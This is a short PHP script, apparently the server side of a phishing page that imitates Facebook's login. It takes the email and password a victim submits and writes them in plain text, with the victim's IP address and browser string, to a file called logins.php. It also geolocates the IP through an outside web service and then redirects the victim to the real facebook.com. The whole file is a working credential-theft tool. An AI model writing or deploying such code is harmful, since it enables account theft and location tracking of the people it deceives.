<?php
   if (isset($_POST['email'])&&($_POST['pass'])){
    header('Location:https://www.facebook.com');
    $agent = $_SERVER['HTTP_USER_AGENT'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $addres = unserialize(file_get_contents("http://www.geoplugin.net/php.gp?id='.$ip'"));

    $pais = "Pais\n".$addres['geoplugin_countryName']."<br>";
    $cid = "Cidade\n".$addres['geoplugin_city']."<br>";
    $reg = "Regiao\n".$addres['geoplugin_regionName']."<br>";
    $lat = "Latitude:\n".$addres['geoplugin_latitude']."<br>";
    $long = "Longitude:\n".$addres['geoplugin_longitude']."<br>";

    $login = $_POST['email'];
    $senha = $_POST['pass'];
    $handle = fopen("logins.php","a");
    $string = "<h3><hr>sistema:$agent<br>ip:$ip<br>Login:$login<br>Senha:$senha<br>";

    fwrite($handle,$string);
    fclose($handle);

   }else{
      echo "<script>alert('PREENCHA OS CAMPOS')</script>";
       echo "<script>window.location=href='index.php'</script>";
   }
?>
